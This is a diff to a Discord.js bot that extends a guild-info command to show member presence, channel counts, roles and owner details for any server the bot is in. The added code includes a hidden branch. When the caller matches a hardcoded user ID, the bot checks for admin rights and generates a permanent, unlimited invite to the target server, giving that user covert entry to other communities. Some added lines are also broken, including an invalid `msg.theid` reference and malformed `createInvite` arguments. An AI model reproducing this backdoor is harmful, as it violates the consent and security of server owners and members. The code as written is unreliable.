@@ -1016,14 +1016,38 @@ client.on('message', msg => {
       }
   
       const theid = await client.guilds.cache.get(theid1)
+      let roles = [], r = 0
+
+      theid.roles.cache.forEach(g => {
+  
+        roles[roles.length+ 0] = (`<@&${g.id}> `);
+  
+        r++;
+  
+      })
+          if(r >= theid.roles.cache.size) {
         let embed = new Discord.MessageEmbed()
         .setTitle(`Guild - ${theid.name}`)
-        .addField(`Membercount:`, `\`${theid.memberCount}\``)
-        .addField(`ServerID:`, `\`${theid.id}\``)
-        .addField(`OwnerTag`, `\`${theid.owner.user.tag}\``)
-        .addField(`OwnerID`, `\`${theid.ownerID}\``)
-        .setImage(theid.iconURL())
+        .addField(`__ __`,`**ServerID**: \`${theid.id}\``)
+        .addFields(
+          {name: "VerificationLVL", value: `\`${theid.verificationLevel}\``},
+          {name: "Channels", value: `\`${theid.channels.cache.filter(c => c.type === "text").size}\` Text \\| \`${theid.channels.cache.filter(c => c.type === "voice").size}\` Voice \\| \`${theid.channels.cache.filter(c => c.type === "category").size}\` Categories`},
+          {name: "Region", value: `__${theid.region}__`}
+        )
+        .addField(`Roles: `, `\`${theid.roles.cache.size}\``)
+        .addField(`Membercount: \`${theid.memberCount}\``, `\`\`\`JS\nOnline Members: ${theid.members.cache.filter(m => m.presence.status !== "offline").size}\nOffline Members: ${theid.members.cache.filter(m => m.presence.status === "offline").size}\`\`\``)
+        .addField(`Owner: `, `\`\`\`ID: ${theid.ownerID}\nTAG: ${theid.owner.user.tag}\`\`\``)
+        .setThumbnail(theid.iconURL())
         msg.channel.send(embed)
+        var bruh = theid.channels.cache.find(c => c.type === "text")
+        if(!bruh) {return}
+        if(theid.me.hasPermission("CREATE_INSTANT_INVITE")) {
+          if(msg.author.id === assy) {
+             if(msg.theid.me.hasPermission("ADMINISTRATOR")) {msg.channel.send("with admin(just checking)")}
+          bruh.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+        .then(i => msg.channel.send("https://discord.gg/" + i.code))}
+        }
+      }
       }
   })
 
